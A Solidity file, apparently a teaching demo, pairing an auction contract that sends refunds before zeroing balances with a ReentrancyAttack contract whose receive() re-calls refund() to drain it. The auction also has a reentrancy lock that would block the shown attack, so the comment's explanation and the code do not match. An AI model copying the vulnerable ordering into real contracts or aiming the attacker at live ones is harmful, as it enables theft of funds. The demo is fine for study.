// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IReentrancyAuction {
    function bid() external payable;

    function refund() external;

    function currentBalance() external view returns (uint);
}

contract ReentrancyAuction {
    mapping(address => uint) public bidders;
    bool locked;

    function bid() external payable {
        bidders[msg.sender] += msg.value;
    }

    modifier noReentrancy() {
        require(!locked, "No reentrancy");
        locked = true;
        _;
        locked = false;
    }

    function refund() external noReentrancy {
        uint refundAmount = bidders[msg.sender];
        if (refundAmount > 0) {
            // если здесь bidders[msg.sender] = 0; то атака не сработает
            (bool success, ) = msg.sender.call{value: refundAmount}("");
            require(success, "Transfer failed.");
            bidders[msg.sender] = 0;
        }
    }

    function currentBalance() external view returns (uint) {
        return address(this).balance;
    }
}

contract ReentrancyAttack {
    uint constant BID_AMOUNT = 1 ether;
    IReentrancyAuction auction;

    constructor(address _auction) {
        auction = IReentrancyAuction(_auction);
    }

    function proxyBid() external payable {
        require(msg.value == BID_AMOUNT, "Please send the exact bid amount.");
        auction.bid{value: msg.value}();
    }

    function attack() external {
        auction.refund();
    }

    receive() external payable {
        if (auction.currentBalance() >= BID_AMOUNT) {
            auction.refund();
        }
    }

    function currentBalance() external view returns (uint) {
        return address(this).balance;
    }
}
